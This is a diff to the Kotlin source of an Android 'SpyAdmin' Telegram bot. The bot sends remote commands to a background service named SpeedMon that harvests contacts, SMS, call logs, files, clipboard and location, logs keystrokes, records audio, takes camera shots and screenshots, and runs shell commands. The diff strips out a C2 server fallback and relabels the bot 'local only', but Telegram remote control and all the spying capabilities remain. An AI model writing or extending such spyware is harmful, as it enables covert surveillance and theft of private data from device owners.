@@ -5,6 +5,8 @@ import android.content.Intent
 import android.content.SharedPreferences
 import android.util.Log
 import com.google.gson.Gson
+import com.google.gson.reflect.TypeToken
+import kotlin.concurrent.thread
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
@@ -44,7 +46,7 @@ class TelegramBotService(private val context: Context) {
         running = true
         pollThread = Thread({ pollLoop() }, "telegram-bot-poll")
         pollThread?.start()
-        Log.d("TelegramBot", "Bot started")
+        Log.d("TelegramBot", "Bot started - LOCAL ONLY MODE")
         // Send onboard notification ONLY once ever
         if (!prefs.getBoolean(KEY_ONBOARD_SENT, false)) {
             notifyOnboard("Admin App")
@@ -121,25 +123,25 @@ class TelegramBotService(private val context: Context) {
             text == "/start" -> {
                 sendMessage(chatId, getHelpMessage())
             }
-            text == "/status" -> sendStatus(chatId)
-            text == "/agents" -> sendAgentsList(chatId)
+            text == "/status" -> sendLocalStatus(chatId)
+            text == "/agents" -> sendLocalAgents(chatId)
             text == "/help" -> sendMessage(chatId, getHelpMessage())
-            text == "/contacts" -> sendTask(chatId, "contacts", mapOf())
-            text == "/sms" -> sendTask(chatId, "sms", mapOf())
-            text == "/calls" -> sendTask(chatId, "call_logs", mapOf())
-            text == "/apps" -> sendTask(chatId, "apps", mapOf("action" to "list"))
-            text == "/files" -> sendTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
-            text == "/wifi" -> sendTask(chatId, "wifi", mapOf("action" to "scan"))
-            text == "/clipboard" -> sendTask(chatId, "clipboard", mapOf("action" to "get"))
-            text == "/keylogger_on" -> sendTask(chatId, "keylogger", mapOf("action" to "start"))
-            text == "/keylogger_off" -> sendTask(chatId, "keylogger", mapOf("action" to "stop"))
-            text == "/keylogger_dump" -> sendTask(chatId, "keylogger", mapOf("action" to "dump"))
-            text == "/audio" -> sendTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
-            text == "/camera" -> sendTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
-            text == "/screenshot" -> sendTask(chatId, "screen", mapOf("action" to "capture"))
-            text == "/location" -> sendTask(chatId, "location", mapOf("action" to "get"))
-            text == "/status" -> sendStatus(chatId)
-            text == "/agents" -> sendAgentsList(chatId)
+            text == "/contacts" -> sendLocalTask(chatId, "contacts", mapOf())
+            text == "/sms" -> sendLocalTask(chatId, "sms", mapOf())
+            text == "/calls" -> sendLocalTask(chatId, "call_logs", mapOf())
+            text == "/apps" -> sendLocalTask(chatId, "apps", mapOf("action" to "list"))
+            text == "/files" -> sendLocalTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
+            text == "/wifi" -> sendLocalTask(chatId, "wifi", mapOf("action" to "scan"))
+            text == "/clipboard" -> sendLocalTask(chatId, "clipboard", mapOf("action" to "get"))
+            text == "/keylogger_on" -> sendLocalTask(chatId, "keylogger", mapOf("action" to "start"))
+            text == "/keylogger_off" -> sendLocalTask(chatId, "keylogger", mapOf("action" to "stop"))
+            text == "/keylogger_dump" -> sendLocalTask(chatId, "keylogger", mapOf("action" to "dump"))
+            text == "/audio" -> sendLocalTask(chatId, "audio", mapOf("action" to "start", "duration" to 30))
+            text == "/camera" -> sendLocalTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
+            text == "/screenshot" -> sendLocalTask(chatId, "screen", mapOf("action" to "capture"))
+            text == "/location" -> sendLocalTask(chatId, "location", mapOf("action" to "get"))
+            text == "/status" -> sendLocalStatus(chatId)
+            text == "/agents" -> sendLocalAgents(chatId)
             text.startsWith("/shell ") -> sendShellCommand(chatId, text.substring(7).trim())
             text.startsWith("/task ") -> sendTaskCommand(chatId, text.substring(6).trim())
             text.startsWith("/ai ") -> sendAICommand(chatId, text.substring(4).trim())
@@ -163,7 +165,7 @@ class TelegramBotService(private val context: Context) {
         try {
             val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
             val argsMap = gson.fromJson< Map<String, Any>>(jsonArgs, type)
-            sendTask(chatId, capability, argsMap)
+            sendLocalTask(chatId, capability, argsMap)
         } catch (e: Exception) {
             sendMessage(chatId, "Invalid JSON args: ${e.message}")
         }
@@ -174,7 +176,7 @@ class TelegramBotService(private val context: Context) {
             sendMessage(chatId, "Usage: /shell <command>\nExample: /shell whoami && id")
             return
         }
-        sendTask(chatId, "shell", mapOf("command" to command))
+        sendLocalTask(chatId, "shell", mapOf("command" to command))
     }
 
     // NVIDIA Nemotron 3 Ultra 550B AI Integration
@@ -208,11 +210,11 @@ class TelegramBotService(private val context: Context) {
                     val responseBody = response.body?.string()
                     if (response.isSuccessful && responseBody != null) {
                         try {
-                            val json = gson.fromJson(responseBody, Map::class.java)
-                            val choices = json["choices"] as? List<*> ?: emptyList()
+                            val json: Map<String, Any> = gson.fromJson(responseBody, object : TypeToken<Map<String, Any>>() {}.type)
+                            val choices = json["choices"] as? List<Any> ?: emptyList()
                             if (choices.isNotEmpty()) {
-                                val firstChoice = choices[0] as? Map<*, *> ?: emptyMap()
-                                val message = firstChoice["message"] as? Map<*, *> ?: emptyMap()
+                                val firstChoice = choices[0] as? Map<String, Any> ?: emptyMap()
+                                val message = firstChoice["message"] as? Map<String, Any> ?: emptyMap()
                                 val content = message["content"] as? String ?: "No response"
                                 sendMessage(chatId, "🤖 *Nemotron 3 Ultra 550B:*\n\n$content")
                             } else {
@@ -238,15 +240,8 @@ class TelegramBotService(private val context: Context) {
         sendNVIDIACommand(chatId, prompt)
     }
 
-    private fun sendShellCommand(chatId: Long, command: String) {
-        if (command.isBlank()) {
-            sendMessage(chatId, "Usage: /shell <command>\nExample: /shell whoami && id")
-            return
-        }
-        sendTask(chatId, "shell", mapOf("command" to command))
-    }
-
-    private fun sendTask(chatId: Long, capability: String, args: Map<String, Any>) {
+    // Send task to LOCAL SpeedMon service ONLY - NO C2
+    private fun sendLocalTask(chatId: Long, capability: String, args: Map<String, Any>) {
         val taskId = java.util.UUID.randomUUID().toString()
         
         // Send to local SpeedMon via explicit Intent to start service
@@ -268,58 +263,23 @@ class TelegramBotService(private val context: Context) {
             Log.e("TelegramBot", "Failed to start SpeedMon service", e)
             sendMessage(chatId, "❌ Failed to send to SpeedMon: ${e.message}")
         }
-
-        // Also try C2 if configured (non-blocking)
-        val c2Url = getC2Url()
-        val payload = mapOf(
-            "action" to "task",
-            "capability" to capability,
-            "args" to gson.toJson(args),
-            "timeout" to 30
-        )
-        sendC2Request(c2Url, "/api/command", payload) { resp ->
-            sendMessage(chatId, "📡 C2 Response: $resp")
-        }
+        // NO C2 FALLBACK - LOCAL ONLY
     }
 
-    private fun sendC2Request(baseUrl: String, endpoint: String, payload: Map<String, Any>, callback: (String) -> Unit): String? {
-        try {
-            val url = "$baseUrl$endpoint"
-            val requestBody = payload.toJson().toRequestBody("application/json".toMediaType())
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
-                .build()
-            client.newCall(request).execute().use { response ->
-                val respBody = response.body?.string()
-                respBody?.let { callback(it) }
-                return respBody
-            }
-        } catch (e: Exception) {
-            Log.e("TelegramBot", "C2 request failed", e)
-            return null
-        }
-        return null
+    // Local status - no C2
+    private fun sendLocalStatus(chatId: Long) {
+        sendMessage(chatId, "📊 *Local Status:*\n✅ Bot running\n✅ Local mode active\n✅ SpeedMon: ${isSpeedMonRunning()}")
     }
 
-    private fun sendStatus(chatId: Long) {
-        val c2Url = getC2Url()
-        val payload = mapOf("action" to "list_agents")
-        sendC2Request(c2Url, "/api/agents", payload) { resp ->
-            sendMessage(chatId, "📊 *Agents Status:*\n$resp")
-        } ?: run {
-            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
-        }
+    private fun sendLocalAgents(chatId: Long) {
+        sendMessage(chatId, "🤖 *Local Agents:*\n📱 This device (${android.os.Build.MODEL})")
     }
 
-    private fun sendAgentsList(chatId: Long) {
-        val c2Url = getC2Url()
-        val payload = mapOf("action" to "list_agents")
-        sendC2Request(c2Url, "/api/agents", payload) { resp ->
-            sendMessage(chatId, "🤖 *Connected Agents:*\n$resp")
-        } ?: run {
-            sendMessage(chatId, "⚠️ C2 unreachable (local SpeedMon may still work)")
-        }
+    private fun isSpeedMonRunning(): Boolean {
+        // Check if SpeedMon service is running
+        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+        val services = manager.getRunningServices(100)
+        return services.any { it.service.className == "com.speedmon.SpeedMonService" }
     }
 
     private fun notifyOnboard(userName: String) {
@@ -331,19 +291,14 @@ class TelegramBotService(private val context: Context) {
         sendMessage(ALLOWED_USER_ID, message)
     }
 
-    private fun getC2Url(): String {
-        val adminPrefs = context.getSharedPreferences("admin_config", Context.MODE_PRIVATE)
-        return adminPrefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
-    }
-
     private fun getHelpMessage(): String {
         return """
-🤖 *SpyAdmin Telegram Bot v2.0*
+🤖 *SpyAdmin Telegram Bot v2.0 - LOCAL MODE*
 
 *System Commands:*
 /start - Show this help
-/status - Show C2 status
-/agents - List connected agents
+/status - Show local status
+/agents - List local agents
 /help - Show this message
 
 *🤖 NVIDIA Nemotron 3 Ultra 550B AI:*
@@ -374,6 +329,7 @@ Example: /nvidia Explain quantum computing
 /ai <prompt> - Alias for NVIDIA
 
 *Admin only. Unauthorized users will be rejected.*
+*NO C2 SERVER REQUIRED - 100% LOCAL*
         """.trimIndent()
     }
 
